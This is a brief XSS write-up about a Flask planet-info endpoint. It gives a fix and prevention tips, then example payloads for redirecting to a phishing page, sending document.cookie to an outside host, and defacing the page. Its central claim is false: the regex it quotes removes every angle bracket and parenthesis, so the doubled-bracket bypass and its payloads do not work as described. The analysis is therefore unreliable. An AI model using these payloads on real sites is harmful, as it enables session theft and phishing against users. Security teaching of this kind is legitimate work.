### This code is vulnerable to [XSS](https://portswigger.net/web-security/cross-site-scripting)

Vulnerable Function: `get_planet_info()` and ```get_planet_info_endpoint()```

### Why its vulnerable?

Re: ```sanitized_planet = re.sub(r'[<>(){}[\]]', '', planet) ```
In this regex, the characters <, >, (, ), {, }, [, and ] are explicitly removed, but whitespace characters are not removed. 
and only ```script``` tag is blocked, so we can use other tags like ```img``` to exploit XSS. 


Exploit: 
```js
<<img src="x" onerror="alert(1)">>
``` 

**Explanation**: In this payload, the double angle brackets, `<<` and `>>`, will not be matched by the regex, so the payload remains unaffected, and the XSS attack will execute.

### How to fix?
We can use Flask's built-in function escape from the Markup module. This function helps to escape special characters in the input, preventing them from being executed as HTML or JavaScript.

Example: 

```python
from flask import Flask, request, render_template, jsonify, escape
```

```python
return f'<h2>Planet Details:</h2><p>{escape(details)}</p>'
```
 
### What else can XSS do?
- Steal cookies and session information
- Redirect to malicious websites
- Modify website content
- Phishing
- Keylogging

### How to prevent XSS?
- Sanitize user input properly
- Use Content Security Policy (CSP)
- Use HttpOnly Cookies
- Use X-XSS-Protection header


### Here are some exploit examples:

#### Redirect to phishing page using XSS 
```
<<img src="x" onerror="window.location.href = 'https://google.com';">>
```

#### Get cookies 
```<<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">>
```

#### Modify website content
You can inject any phishing page, malicious page, or any other content to the website using XSS.

```
<<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">> 
```


 